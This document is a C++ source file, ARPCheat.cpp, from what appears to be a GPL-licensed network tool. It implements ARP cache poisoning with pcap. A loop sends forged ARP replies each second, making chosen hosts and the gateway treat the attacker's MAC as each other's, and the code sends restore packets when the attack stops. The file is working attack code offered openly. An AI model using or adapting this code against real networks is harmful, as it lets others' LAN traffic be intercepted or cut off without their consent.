/*
Copyright (C) 2015  xfgryujk

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License along
with this program; if not, write to the Free Software Foundation, Inc.,
51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
*/

//  ARPCheat.cpp: implements ARP cheating.
//

#include "stdafx.h"
#include "ARPCheat.h"
#include "ThreadPool.h"
#include "Helper.h"
#include "NetManager.h"
#include "Packet.h"


void ARPCheat::init()
{
	g_netManager.AddOnNewHostCallback([this](IpAddress ip, MacAddress mac){
		// add new host config
		GetConfig(ip);
	});
}

ARPCheat::Config& ARPCheat::GetConfig(IpAddress ip)
{
	return m_attackList[ip];
}

void ARPCheat::SetConfig(IpAddress ip, bool attack, bool cheatTarget, bool cheatGateway)
{
	Config& config = GetConfig(ip);
	bool recoverTarget = (config.attack && !attack) || (config.cheatTarget && !cheatTarget);
	bool recoverGateway = (config.attack && !attack) || (config.cheatGateway && !cheatGateway);
	config.attack = attack;
	config.cheatTarget = cheatTarget;
	config.cheatGateway = cheatGateway;

	if (!recoverTarget && !recoverGateway)
		return;

	// recover
	AdapterHandle adapter(GetAdapterHandle());
	if (adapter == nullptr)
		return;

	MacAddress targetMac = g_netManager.m_host[ip];
	ARPPacket packet(false);
	// send to target
	if (recoverTarget)
	{
		packet.SetSender(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
		packet.SetTarget(ip, targetMac);
		pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
	}
	// send to gateway
	if (recoverGateway)
	{
		packet.SetSender(ip, targetMac);
		packet.SetTarget(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
		pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
	}
}

void ARPCheat::StartAttack()
{
	m_isAttacking = true;
	m_cheatThread = std::thread([=]{
		AdapterHandle adapter(GetAdapterHandle());
		if (adapter == nullptr)
			return;

		ARPPacket packet(false);
		packet.SetSender(0, g_netManager.m_selfMac);
		// send
		while (m_isAttacking)
		{
			DWORD time = GetTickCount();
			{ SyncMap<IpAddress, Config>::lock_guard lock(m_attackList.m_lock);
				for (const auto& i : m_attackList)
				{
					if (!i.second.attack)
						continue;
					if (i.second.cheatTarget) // send to target
					{
						TRACE("%s\n", (CString)i.first);
						packet.SetTarget(i.first, g_netManager.m_host[i.first]);
						packet.senderIp = g_netManager.m_selfGateway;
						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
					}
					if (i.second.cheatGateway) // send to gateway
					{
						packet.SetTarget(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
						packet.senderIp = i.first;
						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
					}
				}
			}
			Sleep(1000 - (GetTickCount() - time));
		}

		//////////////////////////////////////////////////////////////////////////////
		// stop attacking

		// recover
		{ SyncMap<IpAddress, Config>::lock_guard lock(m_attackList.m_lock);
			for (const auto& i : m_attackList)
			{
				if (!i.second.attack)
					continue;
				MacAddress targetMac = g_netManager.m_host[i.first];
				// send to target
				packet.SetSender(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
				packet.SetTarget(i.first, targetMac);
				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
				// send to gateway
				packet.SetSender(i.first, targetMac);
				packet.SetTarget(g_netManager.m_selfGateway, g_netManager.m_gatewayMac);
				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
			}
		}

		TRACE("cheat end\n");
	});
}

void ARPCheat::StopAttack()
{
	m_isAttacking = false;
	m_cheatThread.join();
}
